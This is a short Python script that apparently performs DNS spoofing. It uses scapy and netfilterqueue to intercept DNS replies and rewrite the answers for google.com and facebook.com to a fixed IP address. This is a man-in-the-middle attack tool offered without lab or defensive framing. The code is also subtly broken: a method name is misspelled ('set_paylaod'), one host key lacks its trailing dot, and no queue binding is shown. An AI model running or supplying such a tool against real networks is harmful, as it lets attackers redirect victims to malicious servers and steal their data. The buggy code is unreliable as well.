from scapy.all import *
from netfilterqueue import NetfilterQueue
import os

#defining dns directory

dns_hosts={
    b"www.google.com.":"172.67.145.12",
    b"google.com.":"172.67.145.12",
    b"facebook.com":"172.67.145.12"
}

def process_packet(packet):
    #convert netfilter queue packet to scapy packet
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        #if the packet is a DNS Resource Record (DNS reply)
        #modify the packet
        print("[BEFORE]:",scapy_packet.summary())
        try:
            scapy_packet=modify_packet(scapy_packet)
        except IndexError:
            pass
        print("[AFTER]:",scapy_packet.summary())
        #set back as netfilter queue packet
        packet.set_paylaod(bytes(scapy_packet))
    
    packet.accept()

def modify_packet(packet):
    qname=packet[DNSQR].qname

    if qname not in dns_hosts:
        print("no modification:",qname)
        return packet
    
    packet[DNS].an = DNSRR(rrname=qname,rdata=dns_hosts[qname])
    packet[DNS].ancount=1

    #del the checksums and length of packet 
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum

    return packet
    